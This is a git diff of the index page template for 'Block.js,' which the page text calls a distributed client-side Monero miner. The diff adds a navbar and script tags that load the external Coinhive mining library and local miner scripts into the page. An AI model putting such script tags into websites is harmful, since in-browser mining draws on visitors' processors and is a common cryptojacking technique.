@@ -1,11 +1,20 @@
 <!-- views/pages/index.ejs -->
 <% include partials/head %>
+
+<!-- Navbar -->
+<% include partials/header %>
+
 <main>
     <div class="jumbotron">
-        <h1>Nothing is real.</h1>
+        <h1>Block.js</h1>
         <p>Welcome to Block.js, a distributed client-side Monero miner.</p>
     </div>
 </main>
 
-<% include partials/footer %>
+<script src="/modules/jquery.js"></script>
+<script src="/modules/socket.io.js"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="/miner.js"></script>
+<script src="/miner-controller.js"></script>
 
+<% include partials/footer %>
